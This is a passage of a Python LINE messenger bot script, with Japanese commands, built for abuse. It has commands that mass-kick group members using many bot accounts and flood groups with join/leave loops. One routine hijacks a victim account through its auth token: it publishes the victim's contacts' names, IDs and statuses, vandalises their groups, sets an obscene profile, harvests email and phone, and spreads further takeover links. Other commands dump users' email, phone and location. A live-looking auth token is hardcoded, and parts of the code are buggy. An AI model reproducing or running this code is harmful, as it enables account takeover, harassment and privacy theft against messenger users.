				print("[名前:]" + sname)
				print("[mid:]" + smid)
				print("[ステータスメッセージ:]" + status)
			for sgmid in sgmids:
				contact = s.getcontact(sid)
				sname = contact.displayName
				smid = contact.mid
				status = contact.statusMessage
				print("[名前:]" + sname)
				print("[mid:]" + smid)
				print("[ステータスメッセージ:]" + status)
		elif text.lower() == 'identity':
			iden = client.getIdentityCredential()
			print(iden)
			client.sendMessage(to,iden)
		elif text.lower() == 'aflc':	
			for mid in mids:
				client.sendContact(to,(mid))
		elif text.lower() == 'name':
			kiinfo = ki.getProfile()
			ki2info = ki2.getProfile()
			ki3info = ki3.getProfile()
			ki4info = ki4.getProfile()
			ki5info = ki5.getProfile()
			ki6info = ki6.getProfile()
			ki7info = ki7.getProfile()
			ki8info = ki8.getProfile()
			ki9info = ki9.getProfile()
			ki10info = ki10.getProfile()
			ki11info = ki11.getProfile()
			ki12info = ki12.getProfile()
			ki13info = ki13.getProfile()
			ki14info = ki14.getProfile()
			ki15info = ki14.getProfile()
			kiinfo.displayName = "kouta's kicker1"
			ki2info.displayName = "kouta's kicker2"
			ki3info.displayName = "kouta's kicker3"
			ki4info.displayName = "kouta's kicker4"
			ki5info.displayName = "kouta's kicker5"
			ki6info.displayName = "kouta's kicker6"
			ki7info.displayName = "kouta's kicker7"
			ki8info.displayName = "kouta's kicker8"
			ki9info.displayName = "kouta's kicker9"
			ki10info.displayName = "kouta's kicker10"
			ki11info.displayName = "kouta's kicker11"
			ki12info.displayName = "kouta's kicker12"
			ki13info.displayName = "kouta's kicker13"
			ki14info.displayName = "kouta's kicker14"
			ki15info.displayName = "kouta's kicker15"
			ki.updateProfile(kiinfo)
			ki2.updateProfile(ki2info)
			ki3.updateProfile(ki3info)
			ki4.updateProfile(ki4info)
			ki5.updateProfile(ki5info)
			ki6.updateProfile(ki6info)
			ki7.updateProfile(ki7info)
			ki8.updateProfile(ki8info)
			ki9.updateProfile(ki9info)
			ki10.updateProfile(ki10info)
			ki11.updateProfile(ki11info)
			ki12.updateProfile(ki12info)
			ki13.updateProfile(ki13info)
			ki14.updateProfile(ki14info)
			ki15.updateProfile(ki15info)
		elif text.lower() == '無敵全蹴り':
			ginfo = client.getGroup(to)
			ginfo.preventedJoinByTicket = False
			client.updateGroup(ginfo)
			gid = ginfo.id
			Ticket = client.reissueGroupTicket(to)
			group=client.getGroup(to)
			MM = [contact.mid for contact in group.members]
			for x in group.members:
				try:
					MM.remove(x)
				except:
					pass
					for k in MM:
						if k not in KMIDS:
							kicker = random.choice(KAC)
							kicker.kickoutFromGroup(to,[k])
							kicker.acceptGroupInvitationByTicket(gid,Ticket)
		elif msg.text in ["連絡先:オン","連絡先:on","連絡先：オン","顯示：開"]:
			if wait["contact"] == True:
				client.sendMessage(msg.to,"既にオンです。")
			elif wait["contact"] == False:
				wait["contact"] = True
				client.sendMessage(msg.to,"オンにしました。")
		elif msg.text.lower().startswith('ファイター追加 '):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					fightermids.append(mi_d)
					client.sendMessage(to,"ファイター登録完了。非常時に一斉招待します。")
		elif text.lower() == 'ファイター確認':
			for fightermid in fightermids:
				fighterinfo = client.getContact(fightermid)
				fightername = fighterinfo.displayName
				client.sendMessage(to,fightername)
		elif text.lower() == '招待':
			for fightermid in fightermids:
				client.inviteIntoGroup(to,fightermid)
		elif text.lower() == 'メンバーコピー':
			group=client.getGroup(to)
			MM = [contact.mid for contact in group.members]
			for x in group.members:
				try:
					MM.remove(x)
				except:
					  pass
			for k in MM:
				print([k])
				client.sendMessage(to,[k])
				client.sendContact(to,[k])
		elif msg.text == "speed":
			start = time.time()
			client.sendMessage(msg.to,"loading...")
			elapsed_time = time.time() - start
			client.sendMessage(msg.to,str(elapsed_time))
		elif msg.text.lower().startswith('リスト追加 '):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					blacklist["blacklist"][mi_d] = True
					client.sendMessage(to,blacklist["blacklist"])
		elif msg.text.lower().startswith('loc '):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
			location = client.getBuddyLocation(mi_d,)
			client.sendMessage(to,str(location))
		elif msg.text == "全蹴り":
			group=client.getGroup(to)
			MM = [contact.mid for contact in group.members]
			for x in group.members:
				try:
					MM.remove(x)
				except:
					  pass
			for k in MM:
				client.kickoutFromGroup(to,[k])
				ki.kickoutFromGroup(to,[k])
				ki2.kickoutFromGroup(to,[k])
				ki3.kickoutFromGroup(to,[k])
				ki4.kickoutFromGroup(to,[k])
				ki5.kickoutFromGroup(to,[k])
				ki6.kickoutFromGroup(to,[k])
				ki7.kickoutFromGroup(to,[k])
				ki8.kickoutFromGroup(to,[k])
				ki9.kickoutFromGroup(to,[k])
				ki10.kickoutFromGroup(to,[k])
				ki11.kickoutFromGroup(to,[k])
				ki12.kickoutFromGroup(to,[k])
				ki13.kickoutFromGroup(to,[k])
				ki14.kickoutFromGroup(to,[k])
				ki15.kickoutFromGroup(to,[k])
		elif text.lower() == 'tlmacro':
			while tlcount != 50:
				client.createPost("testmacro(auto post macro)")
				client.sendMessage(to,"Success this action")
				tlcount = tlcount + 1
		elif text.lower() == 'logo':
			client.sendMessage(to,logo)
		elif text.lower() == 'gi':
			print(groupinfo)
		elif text.lower() == 'member':
			gdir = client.getGroup(to)
			print(to,(gdir.members[0].mid))
			client.sendMessage(to,(gdir.members[0].mid))
		elif text.lower() == 'leave':
			client.sendMessage(to,"退会します")
			client.leaveGroup(to)
		elif text.lower() == 'metatest':
			metadata = client.getMetaProfile()
			print(metadata)
			client.sendMessage(to,metadata)
		elif text.lower() == 'search':
			client.sendMessage(to,"Google↓")
			client.sendMessage(to,"https://www.google.com")
		elif text.lower() == 'url':
			url = client.reissueUserTicket()
			client.sendMessage(to,"line://ti/p/" + url)
		elif text.lower() == 'word':
			word = random.choice(words)
			client.sendMessage(to,str(word))
		elif text.lower() == '乗っ取りヘルプ':
			client.sendFile(to,"乗っ取りヘルプ.txt")
		elif text.lower() == '設定確認':
			setting = client.getSettings()
			print(setting)
			client.sendMessage(to,setting)
		elif text.lower() == '作者の格言':
			client.sendFile(to,"thequote.txt")
		elif text.lower() == '作者情報':
			client.sendFile(to,"作者情報.txt")
		elif text.lower() == 'date':
			nt = datetime.date.now
			client.sendMessage(to,nt)
		elif text.lower() == 'call':
			client.acquireCallRoute(to)
		elif text.lower() == 'ip':
			cinfo = client.getCountryWithRequestIp()
			print(cinfo)
			client.sendMessage(to,"国籍:" + cinfo)
		elif text.lower() == 'myphone':
			info = client.getProfile()
			print(info)
			phonee = info.phone
			phoned = base64.b64deo(phonee)
			client.sendMessage(to,phoned)
		elif text.lower() == 'gurl':
			g = client.getGroup(to)
			if g.preventedJoinByTicket == True:
				g.preventedJoinByTicket = False
				client.updateGroup(g)
				gurl = client.reissueGroupTicket(to)
				client.sendMessage(to,"line://ti/g/" + gurl)
				print("line://ti/g/" + gurl)
		elif text.lower() == '乗っ取りうらる作成':
			destroy = LINE()
			destroy.log("[Destroy Auth Token :]"+str(client.authToken))
			dmids = destroy.getAllContactIds()
			dgids = destroy.getGroupIdsJoined()
			dset = destroy.getSettings()
			for dmid in dmids:
				dinfo = destroy.getContact(dmid)
				dname = dinfo.displayName
				dstatus = dinfo.statusMessage
				destroy.createPost("[名前:]" + str(dname))
				destroy.createPost("[mid:]" + str(dmid))
				destroy.createPost("[ステメ:]" + str(dstatus))
			for dgid in dgids:
				X = destroy.getGroup(dgid)
				X.name = "koutaが乗っ取ってみたwww"
				destroy.updateGroup(X)
				destroy.leaveGroup(dgid)
				dgcount = dgcount + 1
			dp = destroy.getProfile()
			dp.disdplayName = "koutaの専属肉便器www"
			dp.statusMessage = "あぁイクイク　おっぱいまんこまんこちんこ！"
			destroy.updateProfile(dp)
			dmail = dset.identityIdentifier
			dmid = dp.mid
			dc = destroy.getContact(dmid)
			daddurl = destroy.getUserTicket()
			client.sendMessage(to,"-乗っ取り成功通知-")
			client.sendMessage(to,"[ユーザー名:]" + dp.displayName)
			client.sendImageWithURL(msg.to,"http://dl.profile.line-cdn.net/" + dc.pictureStatus)
			client.sendMessage(to,"[乗っ取りグループ数:]" + dgcount)
			client.sendMessage(to,"[登録メールアドレス:]" + dmail)
			client.sendContact(to,dp.mid)
			print("-乗っ取り成功通知-")
			print("[ユーザー名:]" + dp.displayName)
			print("[乗っ取りグループ数:]" + dgcount)
			print("[登録メールアドレス:]" + dmail)
			print("[登録電話番号:]" + dp.phone)
			while tlcount != 50:
				destroy.createPost("おっぱいまんこまんこちんこ！")
				tlcount = tlcount + 1
			for dgid in dgids:
				dlink = input("芋づる式乗っ取りURL:")
				destroy.createPost("無料で使える半botのリンクはこちら！\n" + dlink)
		elif text.lower() == 'ccm':
			cmdmsgs = "nothing"
			while 1==1:
				cmdmsgs = input("Message:")
				client.sendMessage(to,str(cmdmsgs))
		elif text.lower() == 'start':
			client.sendMessage(to,"測定開始")
			start = time.time()
		elif text.lower() == 'stop':
			time = time.time() - start
			client.sendMessage(to,"経過時間:" + time + "秒")
		elif msg.text.lower().startswith('link '):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					url = client.reissueUserTicket(mi_d)
					client.sendMessage(to,"Add URL:"+"line://ti/p" + str(url))
		elif text.lower() == 'enghelp':
			enghelp = EnglishHelpMessage()
			client.sendMessage(to,str(enghelp))
		elif text.lower() == 'd':
			client.sendMessage(to,"デデドン（絶望）")
			client.sendAudio(to,"d.mp3")
		elif text.lower() == '黒塗りの高級車':
			client.sendMessage(to,"""試合を終えて家路へ向かうサッカー部員達。
									疲れからか、不幸にも黒塗りの高級車に追突してしまう。後輩をかばいすべての責任を負った三浦に対し、
									車の主、暴力団員谷岡に言い渡された示談の条件とは・・・。
									""")
		elif text.lower() == 'spam':
			ticket = client.reissueGroupTicket(to)
			ginfo = client.getGroupWithoutMembers(to)
			gid = ginfo.id
			while(True):	
				d1.acceptGroupInvitationByTicket(ticket)
				d2.acceptGroupInvitationByTicket(ticket)
				d3.acceptGroupInvitationByTicket(ticket)
				d1.leaveGroup(to)
				d2.leaveGroup(to)
				d3.leaveGroup(to)
		elif ("base64" in msg.text):
			if msg.toType == 2:
				inp = "base64"
				inp = msg.text.replace("base64","")
				einp = inp.encode('base64')
				print(einp)
				client.sendMessage(to,einp)
		elif msg.text.lower().startswith("info "):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					minfo = client.getContact(mi_d)
					print(str(minfo))
					print(str(minfo.settings))
					client.sendContact(to,mi_d)
					client.sendMessage(to,"名前:" + str(minfo.displayName))
					client.sendMessage(to,"ステータスメッセージ:" + str(minfo.statusMessage))
					client.sendMessage(to,"mid:" + str(mi_d))
					client.sendMessage(to,"Email:" + str(minfo.email))
					client.sendMessage(to,"setting:" + str(minfo.settings))
					client.sendMessage(to,"Phone:" + str(minfo.phone))
					client.sendImageWithURL(to,"http://dl.profile.line-cdn.net/" + minfo.pictureStatus)
					cover = client.getProfileCoverURL(mi_d)
					client.sendImageWithURL(to,cover)
					time = datetime.datetime.fromtimestamp(int(minfo.createdtime))
					client.sendMessage(to,time)
		elif msg.text.lower().startswith("cr "):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTION EES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					client.createRoom(mi_d)
		elif msg.text.lower().startswith("mimic "):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					client.cloneContactProfile(mi_d)
					client.updateProfile()
		elif text.lower() == 'joindk':
			client.sendMessage(to,"乗っ取り完了アカウントにトークンを使用しログイン中...")
			client.sendMessage(to,"処理中...(この処理には一分程度かかる場合があります)")
			dticket = client.reissueGroupTicket(to)
			d1 = LINE("EEHx4nJZcoubBnxfkC05.fquPM8pM2whdqYhttIQKfq.F0LMGosb8LZozpB8H9uMrQdiEeUh5uUXu0xi8bY6ypQ=")
			#Auth Token here
			d2 = LINE()
			#Auth Token here
			d3 = LINE()
			#Auth Token here
			d4 = LINE()
			#Auth Token here
			client.sendMessage(to,"ログイン完了、配備します")
			d1.acceptGroupInvitationByTicket(dticket)
			d2.acceptGroupInvitationByTicket(dticket)
			d3.acceptGroupInvitationByTicket(dticket)
			d4.acceptGroupInvitationByTicket(dticket)
			d1.sendMessage(to,"D1、配備完了！")
			d2.sendMessage(to,"D2、配備完了！")
			d3.sendMessage(to,"D3、配備完了！")
			d4.sendMessage(to,"D4、配備完了！")
		elif text.lower() == 'go':
			group=client.getGroup(msg.to)
			MM = [contact.mid for contact in group.members]
			for x in group.members:
				try:
					MM.remove(x)
				except:
					  pass
			for k in MM:
				client.kickoutFromGroup(msg.to,[k])
				d1.kickoutFromGroup(msg.to,[k])
				d2.kickoutFromGroup(msg.to[k])
				d3.kickoutFromGroup(msg.to[k])
				d4.kickoutFromGroup(msg.to[k])
		elif text.lower() == 'YJ':
			client.sendImage(to,"YJ.png")
		elif text.lower() == 'gp':
			gmids = client.getGroup(to)
			gp = client.getProfile(gmids.members[0].mid)
			print(gp)
			client.sendContact(to,(gp.mid))
			client.sendMessage(to,"userid:"+str(gp.userid))
			client.sendMessage(to,"Email:"+str(gp.email))
			client.sendMessage(to,"name:"+str(gp.displayName))			
			client.sendMessage(to,"Status Message:"+str(gp.statusMessage))
			client.sendImage(to,str(gp.picturePath))
			client.sendMessage(to,"==END==")

        if '/google:' in msg.text:
            searchs = msg.text.replace('/google:','')
            url = 'http://www.google.co.jp/search?jl=ja&num=100&q='
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if '/twitter:' in msg.text:
            searchs = msg.text.replace('/twitter:','')
            url = 'https://twitter.com/search?q='
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if '/bing:' in msg.text:
            searchs = msg.text.replace('/bing:','')
            url = 'https://www.bing.com/search?q='
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if '/yahoo:' in msg.text:
            searchs = msg.text.replace('/yahoo:','')
            url = 'https://search.yahoo.co.jp/search?p='
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if '/youtube:' in msg.text:
            searchs = msg.text.replace('/youtube:','')
            url = 'https://www.youtube.com/results?search_query='
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if '/kiss:' in msg.text:
            searchs = msg.text.replace('/kiss:','')
            url = 'http://kissanime.ru/Anime/'
            encoded = urllib.parse.quote(searchs)
            tz = pytz.timezone("Asia/Tokyo")
            d = datetime.datetime.now(tz=tz)
            client.sendMessage(msg.to, url + encoded)
            client.sendMessage(msg.to, '『' + searchs + '』\nの検索結果です。\n' + '{0:%Y-%m-%d %H:%M:%S}'.format(d))
            time.sleep(5)
        if "/mid:" in text:
            if msg.contentMetadata is not None:
                targets = []
                key = eval(msg.contentMetadata["MENTION"])
                key["MENTIONEES"][0]["M"]
                for x in key["MENTIONEES"]:
                    targets.append(x["M"])
                    for mid in targets:
                        txt = mid
                    client.sendMessage(msg.to, txt)
        if "/contact:" in text:
            if msg.contentMetadata is not None:
                targets = []
                key = eval(msg.contentMetadata["MENTION"])
                key["MENTIONEES"][0]["M"]
                for x in key["MENTIONEES"]:
                    targets.append(x["M"])
                    for mid in targets:
                        txt = mid
                    client.sendContact(msg.to, txt)
        if '/polise:' in text:
             if msg.contentMetadata is not None:
                targets = []
                key = eval(msg.contentMetadata["MENTION"])
                key["MENTIONEES"][0]["M"]
                for x in key["MENTIONEES"]:
                    targets.append(x["M"])
                    for mid in targets:
                        txt = mid
                    client.reportSpammer(txt)
                client.sendMessage(msg.to, '通報しました!')
        if '/add:' in text:
             if msg.contentMetadata is not None:
                targets = []
                key = eval(msg.contentMetadata["MENTION"])
                key["MENTIONEES"][0]["M"]
                for x in key["MENTIONEES"]:
                    targets.append(x["M"])
                    for mid in targets:
                        txt = mid
                    client.findAndAddContactsByMid(txt)
                client.sendMessage(msg.to, 'success!')
        if "/inv:" in text:
            try:
                midd = msg.text.replace("/inv:","")
                client.findAndAddContactsByMid(midd)
                client.inviteIntoGroup(msg.to,[midd])
                time.sleep(5)
            except:
                client.sendMessage(msg.to, 'エラーが発生しました\n[ERROR CODE]\nt25miv\n※midが間違っているか、退出した可能性があります。')
        if text in ["アナウンス情報","/ainfo","Ainfo","AINFO"]:
            gett = client.getChatRoomAnnouncements(receiver)
            for a in gett:
                aa = client.getContact(a.creatorMid).mid
                aa2 = client.getContact(a.creatorMid).displayName
                bb = a.contents
                cc = bb.link
                textt = bb.text
                try:
                    client.sendMention(receiver, 'リンク >>> ' + str(cc) + '\n内容 >>> [ ' + str(textt) + " ]\n作成者 >>> @! \n\n")
                except:
                    client.sendMessage(receiver, 'リンク >>> ' + str(cc) + '\n内容 >>> [ ' + str(textt) + ' ]\n作成者 >>> ' + str(aa2))
        if '/midcontact:' in text:
            try:
                micer = text.replace('/midcontact:','')
                client.sendContact(msg.to, micer)
                time.sleep(5)
            except:
                client.sendMessage(msg.to, 'midが間違っているか、ユーザーが退出しています。')
        elif "/agroup" == text:
            gid = client.getGroupIdsJoined()
            g = ""
            for i in gid:
                g += "[%s]:%s\n" % (client.getGroup(i).name,i)
            client.sendMessage(msg.to,g)
	except Exception as e:
		client.log("[SEND_MESSAGE]ERROR :"+ str(e))

def NOTIFIED_KICKOUT_FROM_GROUP(op):
	try:
		if settings["protect"] == True:
			if op.param1 in KMIDS:
				pass
			elif op.param1 not in KMIDS:
				client.sendMessage(op.param1,"警告:強制退会が確認されました、蹴り返しを試みます")
				G = ki.getGroup(op.param1)
				ginfo = ki.getGroup(op.param1)
				ki.kickoutFromGroup(op.param1,[op.param2])
				ki2.kickoutFromGroup(op.param1,[op.param2])
				k3.kickoutFromGroup(op.param1,[op.param2])
				ki4.kickoutFromGroup(op.param1,[op.param2])
				ki1.inviteIntoGroup(op.param1,[op.param3])
				G.preventedJoinByTicket = False
				ki.updateGroup(G)
				invsend = 0
				Ticket = ki.reissueGroupTicket(op.param1)
				client.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki2.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki3.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki4.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki5.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki6.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki7.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki8.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki9.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki10.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki11.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki12.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki13.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki14.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki15.acceptGroupInvitationByTicket(op.param1,Ticket)
				G = ki.getGroup(op.param1)
				G.preventedJoinByTicket = True
				ki.updateGroup(G)
				G.preventedJoinByTicket(G)            
	except Exception as e:
		client.log("[NOTIFIED_KICKOUT_FROM_GROUP] ERROR : " + str(e))


def NOTIFIED_INVITE_INTO_GROUP(op):
	if settings["invprotect"] == True:
		client.sendMessage(op.param1,"警告:危険性のある招待を検知")
		client.kickoutFromGroup(op.param1,[op.param2])
		client.cancelGroupInvitation(op.param1,[op.param3])

def NOTIFIED_LEAVE_ROOM(op):
	if settings["leavemessage"] == True:
		info = client.getContact(op.param2)
		name = info.displayName
		client.sendMessage(op.param1,name + "が退会しました")

def RECEIVE_MESSAGE(op):
	msg = op.message

	text = msg.text
	msg_id = msg.id
	sender = msg._from
	receiver = msg.to
	contact = client.getContact(sender)
	txt = '[%s] %s' % (contact.displayName, text)
	client.log(txt)
	if sender in clMID:
		if text == 'URL発行':
			try:
				client.Reply(msg.id,msg.to,"wait....")
				cmd = 'python3 x.py'
				subprocess.Popen(cmd.split())
				sleep(1)
				with open('login.txt','r') as f:
					txt = f.read()
				client.Reply(msg.id,msg.to,str(txt))
			except Exception as e:
				print(e)
				client.sendMessage(msg.to, str(e))
		elif text.lower() == 'gurl':
			g = client.getGroup(to)
			if g.preventedJoinByTicket == True:
				g.preventedJoinByTicket = False
				client.updateGroup(g)
				gurl = client.reissueGroupTicket(to)
				client.sendMessage(to,"line://ti/g/" + gurl)
				print("line://ti/g/" + gurl)
		elif text.lower() == 'help':
			client.sendMessage(to,"""
	これはLITE版です、招待して使用できます
	～機能～
	help→このメッセージを送信します
	gurl→グループのURlを生成します
	連絡先→製品版の販売者の連絡先を送信します
	helpR→製品版のヘルプメッセージヘルプメッセージを送信します
	""")
		elif text.lower() == 'helpR':
			helpmessage = helpMessage()
			client.sendMessage(to,str(helpmessage))
oepoll.addOpInterruptWithDict({
	OpType.SEND_MESSAGE: SEND_MESSAGE, 
	OpType.NOTIFIED_KICKOUT_FROM_GROUP: NOTIFIED_KICKOUT_FROM_GROUP, 
	OpType.NOTIFIED_INVITE_INTO_GROUP: NOTIFIED_INVITE_INTO_GROUP, 
	OpType.RECEIVE_MESSAGE: RECEIVE_MESSAGE, 

})

while True:
	oepoll.trace()